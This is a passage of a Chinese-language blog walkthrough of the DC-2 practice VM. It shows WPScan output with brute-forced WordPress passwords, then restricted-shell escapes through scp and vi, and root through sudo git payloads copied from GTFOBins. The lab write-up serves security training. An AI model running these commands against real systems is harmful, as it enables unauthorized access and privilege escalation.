- https://www.wordfence.com/blog/<span class="number">2020</span>/<span class="number">04</span>/unpacking-the<span class="number">-7</span>-vulnerabilities-fixed-<span class="keyword">in</span>-todays-wordpress<span class="number">-5</span><span class="number">-4</span><span class="number">-1</span>-security-update/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/wordpress-develop/security/advisories/<span class="type">GHSA</span><span class="number">-568</span>w<span class="number">-8</span>m88<span class="number">-8</span>g2c</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt; <span class="number">5.4</span><span class="number">.1</span> - <span class="type">Authenticated</span> <span class="type">Cross</span>-<span class="type">Site</span> <span class="type">Scripting</span> (<span class="type">XSS</span>) <span class="keyword">in</span> <span class="type">File</span> <span class="type">Uploads</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.17</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">55438</span>b63<span class="number">-5</span>fc9<span class="number">-4812</span>-afc4<span class="number">-2</span>f1eff800d5f</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2020</span><span class="number">-11026</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2020</span>/<span class="number">04</span>/wordpress<span class="number">-5</span><span class="number">-4</span><span class="number">-1</span>/</span><br><span class="line"> |      - https://core.trac.wordpress.org/changeset/<span class="number">47638</span>/</span><br><span class="line"> |      - https://www.wordfence.com/blog/<span class="number">2020</span>/<span class="number">04</span>/unpacking-the<span class="number">-7</span>-vulnerabilities-fixed-<span class="keyword">in</span>-todays-wordpress<span class="number">-5</span><span class="number">-4</span><span class="number">-1</span>-security-update/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/wordpress-develop/security/advisories/<span class="type">GHSA</span><span class="number">-3</span>gw2<span class="number">-4656</span>-pfr2</span><br><span class="line"> |      - https://hackerone.com/reports/<span class="number">179695</span></span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">5.2</span><span class="number">.3</span> - <span class="type">Hardening</span> <span class="type">Bypass</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.15</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">378</span>d7df5-bce2<span class="number">-406</span>a<span class="number">-86</span>b2-ff79cd699920</span><br><span class="line"> |      - https://blog.ripstech.com/<span class="number">2020</span>/wordpress-hardening-bypass/</span><br><span class="line"> |      - https://hackerone.com/reports/<span class="number">436928</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2019</span>/<span class="number">11</span>/wordpress<span class="number">-5</span><span class="number">-2</span><span class="number">-4</span>-update/</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt; <span class="number">5.4</span><span class="number">.2</span> - <span class="type">Authenticated</span> <span class="type">XSS</span> via <span class="type">Media</span> <span class="type">Files</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.18</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">741</span>d07d1<span class="number">-2476</span><span class="number">-430</span>a-b82f-e1228a9343a4</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2020</span><span class="number">-4047</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2020</span>/<span class="number">06</span>/wordpress<span class="number">-5</span><span class="number">-4</span><span class="number">-2</span>-security-and-maintenance-release/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/wordpress-develop/security/advisories/<span class="type">GHSA</span><span class="number">-8</span>q2w<span class="number">-5</span>m27-wm27</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt; <span class="number">5.4</span><span class="number">.2</span> - <span class="type">Open</span> <span class="type">Redirection</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.18</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">12855</span>f02<span class="number">-432e-4484</span>-af09<span class="number">-7</span>d0fbf596909</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2020</span><span class="number">-4048</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2020</span>/<span class="number">06</span>/wordpress<span class="number">-5</span><span class="number">-4</span><span class="number">-2</span>-security-and-maintenance-release/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/<span class="type">WordPress</span>/commit/<span class="number">10e2</span>a50c523cf0b9785555a688d7d36a40fbeccf</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/wordpress-develop/security/advisories/<span class="type">GHSA</span>-q6pw-gvf4<span class="number">-5</span>fj5</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt; <span class="number">5.4</span><span class="number">.2</span> - <span class="type">Authenticated</span> <span class="type">Stored</span> <span class="type">XSS</span> via <span class="type">Theme</span> <span class="type">Upload</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.18</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/d8addb42-e70b<span class="number">-4439</span>-b828-fd0697e5d9d4</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2020</span><span class="number">-4049</span></span><br><span class="line"> |      - https://www.exploit-db.com/exploits/<span class="number">48770</span>/</span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2020</span>/<span class="number">06</span>/wordpress<span class="number">-5</span><span class="number">-4</span><span class="number">-2</span>-security-and-maintenance-release/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/wordpress-develop/security/advisories/<span class="type">GHSA</span><span class="number">-87</span>h4-phjv-rm6p</span><br><span class="line"> |      - https://hackerone.com/reports/<span class="number">406289</span></span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt; <span class="number">5.4</span><span class="number">.2</span> - <span class="type">Misuse</span> <span class="keyword">of</span> set-screen-option <span class="type">Leading</span> to <span class="type">Privilege</span> <span class="type">Escalation</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.18</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/b6f69ff1<span class="number">-4</span>c11<span class="number">-48</span>d2-b512-c65168988c45</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2020</span><span class="number">-4050</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2020</span>/<span class="number">06</span>/wordpress<span class="number">-5</span><span class="number">-4</span><span class="number">-2</span>-security-and-maintenance-release/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/<span class="type">WordPress</span>/commit/dda0ccdd18f6532481406cabede19ae2ed1f575d</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/wordpress-develop/security/advisories/<span class="type">GHSA</span><span class="number">-4</span>vpv-fgg2-gcqc</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt; <span class="number">5.4</span><span class="number">.2</span> - <span class="type">Disclosure</span> <span class="keyword">of</span> <span class="type">Password</span>-<span class="type">Protected</span> <span class="type">Page</span>/<span class="type">Post</span> <span class="type">Comments</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.18</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/eea6dbf5-e298<span class="number">-44</span>a7<span class="number">-9</span>b0d-f078ad4741f9</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2020</span><span class="number">-25286</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2020</span>/<span class="number">06</span>/wordpress<span class="number">-5</span><span class="number">-4</span><span class="number">-2</span>-security-and-maintenance-release/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/<span class="type">WordPress</span>/commit/c075eec24f2f3214ab0d0fb0120a23082e6b1122</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> <span class="number">4.7</span><span class="number">-5.7</span> - <span class="type">Authenticated</span> <span class="type">Password</span> <span class="type">Protected</span> <span class="type">Pages</span> <span class="type">Exposure</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.20</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">6</span>a3ec618-c79e<span class="number">-4</span>b9c<span class="number">-9020</span><span class="number">-86</span>b157458ac5</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2021</span><span class="number">-29450</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2021</span>/<span class="number">04</span>/wordpress<span class="number">-5</span><span class="number">-7</span><span class="number">-1</span>-security-and-maintenance-release/</span><br><span class="line"> |      - https://blog.wpscan.com/<span class="number">2021</span>/<span class="number">04</span>/<span class="number">15</span>/wordpress<span class="number">-571</span>-security-vulnerability-release.html</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/wordpress-develop/security/advisories/<span class="type">GHSA</span>-pmmh<span class="number">-2</span>f36-wvhq</span><br><span class="line"> |      - https://core.trac.wordpress.org/changeset/<span class="number">50717</span>/</span><br><span class="line"> |      - https://www.youtube.com/watch?v=<span class="number">3</span>NBxcmqCgt4</span><br><span class="line"></span><br><span class="line">[+] <span class="type">WordPress</span> theme <span class="keyword">in</span> use: twentyseventeen</span><br><span class="line"> | <span class="type">Location</span>: http://dc<span class="number">-2</span>/wp-content/themes/twentyseventeen/</span><br><span class="line"> | <span class="type">Last</span> <span class="type">Updated</span>: <span class="number">2021</span><span class="number">-03</span><span class="number">-09</span>T00:<span class="number">00</span>:<span class="number">00.000</span>Z</span><br><span class="line"> | <span class="type">Readme</span>: http://dc<span class="number">-2</span>/wp-content/themes/twentyseventeen/<span class="type">README</span>.txt</span><br><span class="line"> | [!] <span class="type">The</span> version is out <span class="keyword">of</span> date, the latest version is <span class="number">2.6</span></span><br><span class="line"> | <span class="type">Style</span> <span class="type">URL</span>: http://dc<span class="number">-2</span>/wp-content/themes/twentyseventeen/style.css?ver=<span class="number">4.7</span><span class="number">.10</span></span><br><span class="line"> | <span class="type">Style</span> <span class="type">Name</span>: <span class="type">Twenty</span> <span class="type">Seventeen</span></span><br><span class="line"> | <span class="type">Style</span> <span class="type">URI</span>: https://wordpress.org/themes/twentyseventeen/</span><br><span class="line"> | <span class="type">Description</span>: <span class="type">Twenty</span> <span class="type">Seventeen</span> brings your site to life with header video and immersive featured images. <span class="type">With</span> a fo...</span><br><span class="line"> | <span class="type">Author</span>: the <span class="type">WordPress</span> team</span><br><span class="line"> | <span class="type">Author</span> <span class="type">URI</span>: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | <span class="type">Found</span> <span class="type">By</span>: <span class="type">Css</span> <span class="type">Style</span> <span class="type">In</span> <span class="type">Homepage</span> (<span class="type">Passive</span> <span class="type">Detection</span>)</span><br><span class="line"> |</span><br><span class="line"> | <span class="type">Version</span>: <span class="number">1.2</span> (<span class="number">80</span>% confidence)</span><br><span class="line"> | <span class="type">Found</span> <span class="type">By</span>: <span class="type">Style</span> (<span class="type">Passive</span> <span class="type">Detection</span>)</span><br><span class="line"> |  - http://dc<span class="number">-2</span>/wp-content/themes/twentyseventeen/style.css?ver=<span class="number">4.7</span><span class="number">.10</span>, <span class="type">Match</span>: &#x27;<span class="type">Version</span>: <span class="number">1.2</span>&#x27;</span><br><span class="line"></span><br><span class="line">[+] <span class="type">Enumerating</span> <span class="type">All</span> <span class="type">Plugins</span> (via <span class="type">Passive</span> <span class="type">Methods</span>)</span><br><span class="line"></span><br><span class="line">[i] <span class="type">No</span> plugins <span class="type">Found</span>.</span><br><span class="line"></span><br><span class="line">[+] <span class="type">Enumerating</span> <span class="type">Config</span> <span class="type">Backups</span> (via <span class="type">Passive</span> and <span class="type">Aggressive</span> <span class="type">Methods</span>)</span><br><span class="line"> <span class="type">Checking</span> <span class="type">Config</span> <span class="type">Backups</span> - <span class="type">Time</span>: <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> &lt;=====================================&gt; (<span class="number">137</span> / <span class="number">137</span>) <span class="number">100.00</span>% <span class="type">Time</span>: <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"></span><br><span class="line">[i] <span class="type">No</span> <span class="type">Config</span> <span class="type">Backups</span> <span class="type">Found</span>.</span><br><span class="line"></span><br><span class="line">[+] <span class="type">Enumerating</span> <span class="type">Users</span> (via <span class="type">Passive</span> and <span class="type">Aggressive</span> <span class="type">Methods</span>)</span><br><span class="line"> <span class="type">Brute</span> <span class="type">Forcing</span> <span class="type">Author</span> <span class="type">IDs</span> - <span class="type">Time</span>: <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> &lt;======================================&gt; (<span class="number">10</span> / <span class="number">10</span>) <span class="number">100.00</span>% <span class="type">Time</span>: <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"></span><br><span class="line">[i] <span class="type">User</span>(s) <span class="type">Identified</span>:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | <span class="type">Found</span> <span class="type">By</span>: <span class="type">Rss</span> <span class="type">Generator</span> (<span class="type">Passive</span> <span class="type">Detection</span>)</span><br><span class="line"> | <span class="type">Confirmed</span> <span class="type">By</span>:</span><br><span class="line"> |  <span class="type">Wp</span> <span class="type">Json</span> <span class="type">Api</span> (<span class="type">Aggressive</span> <span class="type">Detection</span>)</span><br><span class="line"> |   - http://dc<span class="number">-2</span>/index.php/wp-json/wp/v2/users/?per_page=<span class="number">100</span>&amp;page=<span class="number">1</span></span><br><span class="line"> |  <span class="type">Author</span> <span class="type">Id</span> <span class="type">Brute</span> <span class="type">Forcing</span> - <span class="type">Author</span> <span class="type">Pattern</span> (<span class="type">Aggressive</span> <span class="type">Detection</span>)</span><br><span class="line"> |  <span class="type">Login</span> <span class="type">Error</span> <span class="type">Messages</span> (<span class="type">Aggressive</span> <span class="type">Detection</span>)</span><br><span class="line"></span><br><span class="line">[+] jerry</span><br><span class="line"> | <span class="type">Found</span> <span class="type">By</span>: <span class="type">Wp</span> <span class="type">Json</span> <span class="type">Api</span> (<span class="type">Aggressive</span> <span class="type">Detection</span>)</span><br><span class="line"> |  - http://dc<span class="number">-2</span>/index.php/wp-json/wp/v2/users/?per_page=<span class="number">100</span>&amp;page=<span class="number">1</span></span><br><span class="line"> | <span class="type">Confirmed</span> <span class="type">By</span>:</span><br><span class="line"> |  <span class="type">Author</span> <span class="type">Id</span> <span class="type">Brute</span> <span class="type">Forcing</span> - <span class="type">Author</span> <span class="type">Pattern</span> (<span class="type">Aggressive</span> <span class="type">Detection</span>)</span><br><span class="line"> |  <span class="type">Login</span> <span class="type">Error</span> <span class="type">Messages</span> (<span class="type">Aggressive</span> <span class="type">Detection</span>)</span><br><span class="line"></span><br><span class="line">[+] tom</span><br><span class="line"> | <span class="type">Found</span> <span class="type">By</span>: <span class="type">Author</span> <span class="type">Id</span> <span class="type">Brute</span> <span class="type">Forcing</span> - <span class="type">Author</span> <span class="type">Pattern</span> (<span class="type">Aggressive</span> <span class="type">Detection</span>)</span><br><span class="line"> | <span class="type">Confirmed</span> <span class="type">By</span>: <span class="type">Login</span> <span class="type">Error</span> <span class="type">Messages</span> (<span class="type">Aggressive</span> <span class="type">Detection</span>)</span><br><span class="line"></span><br><span class="line">[+] <span class="type">Performing</span> password attack on <span class="type">Wp</span> <span class="type">Login</span> against <span class="number">3</span> user/s</span><br><span class="line"><span class="type">Trying</span> tom / <span class="type">CeWL</span> <span class="number">5.5</span><span class="number">.0</span> (<span class="type">Grouping</span>) <span class="type">Robin</span> <span class="type">Wood</span> (robin@digi.ninja) (https://digi.ninja/) <span class="type">Time</span>: <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> &lt;&gt; (<span class="number">0</span> / <span class="number">717</span>)  [<span class="type">SUCCESS</span>] - jerry / adipiscing                                                                                      </span><br><span class="line">[<span class="type">SUCCESS</span>] - tom / parturient                                                                                        </span><br><span class="line"><span class="type">Trying</span> admin / flag <span class="type">Time</span>: <span class="number">00</span>:<span class="number">00</span>:<span class="number">22</span> &lt;=========================                   &gt; (<span class="number">649</span> / <span class="number">1127</span>) <span class="number">57.58</span>%  <span class="type">ETA</span>: ??:??:??</span><br><span class="line"></span><br><span class="line">[!] <span class="type">Valid</span> <span class="type">Combinations</span> <span class="type">Found</span>:</span><br><span class="line"> | <span class="type">Username</span>: jerry, <span class="type">Password</span>: adipiscing</span><br><span class="line"> | <span class="type">Username</span>: tom, <span class="type">Password</span>: parturient</span><br><span class="line"></span><br><span class="line">[!] <span class="type">WPScan</span> <span class="type">DB</span> <span class="type">API</span>, <span class="type">HTTP</span> <span class="type">Error</span>: https://wpscan.com/api/v3/status?version=<span class="number">3.8</span><span class="number">.17</span> (<span class="type">Couldn&#x27;t</span> resolve host name)</span><br><span class="line"></span><br><span class="line">[+] <span class="type">Finished</span>: <span class="type">Sat</span> <span class="type">Apr</span> <span class="number">24</span> <span class="number">12</span>:<span class="number">47</span>:<span class="number">49</span> <span class="number">2021</span></span><br><span class="line">[+] <span class="type">Requests</span> <span class="type">Done</span>: <span class="number">852</span></span><br><span class="line">[+] <span class="type">Cached</span> <span class="type">Requests</span>: <span class="number">6</span></span><br><span class="line">[+] <span class="type">Data</span> <span class="type">Sent</span>: <span class="number">256.665</span> <span class="type">KB</span></span><br><span class="line">[+] <span class="type">Data</span> <span class="type">Received</span>: <span class="number">2.718</span> <span class="type">MB</span></span><br><span class="line">[+] <span class="type">Memory</span> used: <span class="number">233.02</span> <span class="type">MB</span></span><br><span class="line">[+] <span class="type">Elapsed</span> time: <span class="number">00</span>:<span class="number">02</span>:<span class="number">20</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>扫出来一堆漏洞，但是由于都需要授权，所以都没有什么利用价值。<br>有价值的是爆出来了两个弱口令，拿到了jerry和tom的用户权限。</p><h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><p>分别登录两个账户，发现jerry的账号是wp的管理员账户，tom只是普通账户。<br>在jerry的page管理页面中查看未发布的页面，找到了flag2。</p><p><img src="https://i.loli.net/2021/04/24/9serGZn8KpNLuH7.png" alt="image-20210424135810069"></p><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><p>想起来nmap还扫出来了一个跑着ssh的7744端口，尝试用爆出来的两个账户登录ssh。<br>使用tom的账号成功登陆上ssh，但是只有<code>rshell(Restricted Shell)</code>。<br>试了许多命令，发现能使用的命令只有<code>less</code>、<code>vi</code>和<code>ls</code>。</p><p><img src="https://i.loli.net/2021/04/24/eSdTkZO8bvFQYUa.png" alt="image-20210424140623070"></p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Poor</span> old <span class="type">Tom</span> is always running after <span class="type">Jerry</span>. <span class="type">Perhaps</span> he should su for all the stress he causes.</span><br><span class="line"><span class="title">flag3</span>.txt (<span class="type">END</span>)</span><br></pre></td></tr></table></figure><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><h3 id="寻找可利用的二进制文件"><a href="#寻找可利用的二进制文件" class="headerlink" title="寻找可利用的二进制文件"></a>寻找可利用的二进制文件</h3><p>查看<code>/bin/</code>目录下的全部二进制文件，在<a href="https://gtfobins.github.io/">GTFObins</a>寻找可用的payload。</p><p><img src="https://i.loli.net/2021/04/24/EMTkQDW5PFebJNm.png" alt="image-20210424170828374"></p><p><code>busybox</code>就可以用来获取shell，但执行时提示<code>command not find</code>。查看一下<code>PATH</code>，发现<code>PATH</code>中只有<code>/home/tom/usr/bin</code>。查看之，发现其中只有<code>less</code>、<code>ls</code>、<code>scp</code>和<code>vi</code>四个二进制文件。</p><h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><h4 id="通过scp获取shell"><a href="#通过scp获取shell" class="headerlink" title="通过scp获取shell"></a>通过<code>scp</code>获取shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh 0&lt;&amp;2 1&gt;&amp;2&#x27;</span> &gt; <span class="variable">$TF</span></span><br><span class="line">chmod +x <span class="string">&quot;<span class="variable">$TF</span>&quot;</span></span><br><span class="line">scp -S <span class="variable">$TF</span> x y:</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/24/DrU8OSAmiypM7Ru.png" alt="image-20210424193536428"></p><h4 id="通过vi获取shell"><a href="#通过vi获取shell" class="headerlink" title="通过vi获取shell"></a>通过<code>vi</code>获取shell</h4><p><code>bash</code>和<code>sh</code>都可以跑的通。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/24/SNUtk53qdyiOBGh.png" alt="image-20210424141408813"></p><p>然后在<code>/home/jerry/</code>目录下找到flag4，使用<code>less</code>读取</p><p><img src="https://i.loli.net/2021/04/24/WJCrQf68hMY7BXD.png" alt="image-20210424142034553"></p><h3 id="修复命令无法使用"><a href="#修复命令无法使用" class="headerlink" title="修复命令无法使用"></a>修复命令无法使用</h3><p>查看PATH发现系统PATH中没有<code>/bin</code>，导致了该目录下的二进制文件无法通过shell直接使用。</p><h4 id="世界线一"><a href="#世界线一" class="headerlink" title="世界线一"></a>世界线一</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br></pre></td></tr></table></figure><h4 id="世界线二"><a href="#世界线二" class="headerlink" title="世界线二"></a>世界线二</h4><p>运行二进制文件的时候通过完整路径使用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/cat flag4.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/24/pwdr4PSIHytNOiL.png" alt="image-20210424142547663"></p><h2 id="final-flag"><a href="#final-flag" class="headerlink" title="final flag"></a>final flag</h2><p>已经获取了shell，那么下一步就是提权。</p><p><img src="https://i.loli.net/2021/04/24/nQu6p2FLU9amEVj.png" alt="image-20210424144326617"></p><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>测试一下，发现服务器上安装有<code>perl</code>、<code>gcc</code>和<code>curl</code>，尝试一下内核提权。<br>使用<a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester/blob/master/Linux_Exploit_Suggester.pl">Linux_Exploit_Suggester</a>来搜素是否存在可用的EXP，结果没有。<br>无法内核提权。</p><p><img src="https://i.loli.net/2021/04/24/jqwMJipbGv4Dm7E.png" alt="image-20210424170517113"></p><h3 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h3><p><img src="https://i.loli.net/2021/04/24/DGUp8H6EF19WmN4.png" alt="image-20210424193829142"></p><p><img src="https://i.loli.net/2021/04/24/pgRnucj31VBQeT8.png" alt="image-20210424194156109"></p><p>两个用户都没有可利用的SUID。</p><h3 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h3><p>查看两个用户的sudo权限，发现jerry有一个运行<code>git</code>的sudo权限。</p><p><img src="https://i.loli.net/2021/04/24/MBgmVvKsOCIw3oi.png" alt="image-20210424195122061"></p><blockquote><p><strong>Sudo</strong></p><p>If the binary is allowed to run as superuser by <code>sudo</code>, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo PAGER=<span class="string">&#x27;sh -c &quot;exec sh 0&lt;&amp;1&quot;&#x27;</span> git -p <span class="built_in">help</span></span><br></pre></td></tr></table></figure><p> This invokes the default pager, which is likely to be <a href="https://gtfobins.github.io/gtfobins/less/"><code>less</code></a>, other functions may apply.</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p <span class="built_in">help</span> config</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><p> The help system can also be reached from any <code>git</code> command, e.g., <code>git branch</code>. This invokes the default pager, which is likely to be <a href="https://gtfobins.github.io/gtfobins/less/"><code>less</code></a>, other functions may apply.</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git branch --<span class="built_in">help</span> config</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><p> Git hooks are merely shell scripts and in the following example the hook associated to the <code>pre-commit</code> action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the <code>-C</code> option.</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line">git init <span class="string">&quot;<span class="variable">$TF</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec /bin/sh 0&lt;&amp;2 1&gt;&amp;2&#x27;</span> &gt;<span class="string">&quot;<span class="variable">$TF</span>/.git/hooks/pre-commit.sample&quot;</span></span><br><span class="line">mv <span class="string">&quot;<span class="variable">$TF</span>/.git/hooks/pre-commit.sample&quot;</span> <span class="string">&quot;<span class="variable">$TF</span>/.git/hooks/pre-commit&quot;</span></span><br><span class="line">sudo git -C <span class="string">&quot;<span class="variable">$TF</span>&quot;</span> commit --allow-empty -m x</span><br></pre></td></tr></table></figure> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line">ln -s /bin/sh <span class="string">&quot;<span class="variable">$TF</span>/git-x&quot;</span></span><br><span class="line">sudo git <span class="string">&quot;--exec-path=<span class="variable">$TF</span>&quot;</span> x</span><br></pre></td></tr></table></figure></blockquote><p>使用上述payload，成功提权。</p><p><img src="https://i.loli.net/2021/04/24/CdYmMB8cNTAJXsQ.png" alt="image-20210424195517515"></p><p>进入<code>/root</code>读取finalflag。</p><p><img src="https://i.loli.net/2021/04/24/dzHmuqbojaQRt4D.png" alt="image-20210424195621799"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Walkthrough-for-DC-02&quot;&gt;&lt;a href=&quot;#Walkthrough-for-DC-02&quot; class=&quot;headerlink&quot; title=&quot;Walkthrough for DC-02&quot;&gt;&lt;/a&gt;Walkthrough for DC-02&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span 